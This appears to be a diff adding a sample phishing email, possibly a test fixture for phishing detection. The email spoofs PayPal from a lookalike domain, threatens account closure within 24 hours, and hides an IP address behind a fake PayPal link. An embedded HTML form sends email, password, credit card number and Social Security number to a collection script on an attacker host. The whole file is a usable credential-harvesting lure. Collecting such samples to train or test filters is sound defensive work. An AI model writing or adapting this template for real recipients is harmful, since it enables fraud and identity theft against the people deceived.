@@ -1,0 +1,54 @@
+From: security@paypa1-alert.tk
+To: victim@example.com
+Subject: URGENT: Your PayPal account has been SUSPENDED - Verify NOW!!
+Date: Mon, 15 Nov 2024 09:23:45 +0000
+Message-ID: <fake123@paypa1-alert.tk>
+Reply-To: harvest@attacker-domain.xyz
+MIME-Version: 1.0
+Content-Type: text/html; charset=UTF-8
+X-Mailer: PHPMailer 5.2.0
+X-Originating-IP: 192.168.1.45
+
+<html>
+<body>
+<p>Dear Valued Customer,</p>
+
+<p>We have detected <strong>suspicious activity</strong> on your PayPal account.
+Your account has been <strong>TEMPORARILY SUSPENDED</strong> due to multiple
+failed login attempts from an unknown location.</p>
+
+<p><strong>IMMEDIATE ACTION REQUIRED</strong> - Your account will be
+<strong>permanently closed</strong> within <strong>24 HOURS</strong> if you
+do not verify your identity.</p>
+
+<p>Please click the link below to verify your account and restore full access:</p>
+
+<p><a href="http://192.168.1.45/paypal-secure-login/verify.php?token=a8f3k2j9">
+http://paypal.com.account-verify-secure.tk/verify
+</a></p>
+
+<form action="http://192.168.1.45/collect.php" method="POST">
+  <p>Email: <input type="text" name="email" /></p>
+  <p>Password: <input type="password" name="password" /></p>
+  <p>Credit Card: <input type="text" name="cc" /></p>
+  <p>SSN: <input type="text" name="ssn" /></p>
+  <input type="submit" value="Verify My Account" />
+</form>
+
+<p>You must provide the following to complete verification:</p>
+<ul>
+  <li>Username and password</li>
+  <li>Credit card number and CVV</li>
+  <li>Social Security Number</li>
+  <li>Date of birth</li>
+</ul>
+
+<p><strong>Failure to respond will result in permanent account closure
+and all funds being held for 180 days.</strong></p>
+
+<p>Act NOW - This is your FINAL WARNING!!!</p>
+
+<p>PayPal Security Team<br>
+security@paypal.com</p>
+</body>
+</html>
